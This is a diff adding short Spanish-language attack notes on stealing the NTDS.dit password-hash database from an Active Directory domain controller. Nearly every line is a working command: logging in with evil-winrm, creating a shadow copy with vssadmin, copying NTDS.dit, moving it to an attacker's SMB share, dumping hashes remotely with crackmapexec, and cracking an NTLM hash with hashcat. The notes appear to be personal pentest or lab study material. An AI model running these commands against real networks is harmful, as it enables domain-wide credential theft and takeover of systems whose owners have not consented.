@@ -1,0 +1,31 @@
+Cuando nos encontramos en un entorno de AD, el archivo que guarda los HASHES y credenciales es el NTDS.dit
+El archivo se encuentra en el DOMAINCONTROLLER %systemroot$/ntds
+Podemos conectarnos al DC con evil-winRm:
+evil-winrm -i <ip>  -u <user> -p 'password'
+
+Podemos ver los privilegios que tiene el user:
+net user <user>
+el campo "Global Group memberships" nos va a decir si es parte del domain admins
+
+También podemos ver si el user pertenece a el grupo local de administradores:
+net localgroup
+
+Si somos administradores en cualquiera de los dos casos podemos crear una copia del NTDS.dit
+
+Para esto creamos un shadow del disco en el que se encuentra instalado el AD (usualmente el C:)
+vssadmin CREATE SHADOW /For=C:
+Esto nos va  agenerar un archivo en un directorio:
+Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+
+cmd.exe /c copy \\?\Ruta_al_archivo_shadow\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+
+luego lo enviamos a nuestro servidor smb para poder dumpearlo y crackearlo en nuestra pc atacante:
+cmd.exe /c move C:\NTDS\NTDS.dit \\<ip>\CompData 
+
+Podemos tambien dumpear el archivo remotamente si tenemos una cuenta de admin:
+crackmapexec smb <ip_dc> -u <user> -p <pass> --ntds
+
+
+luego crackeamos el hash que necesitamos:
+sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+
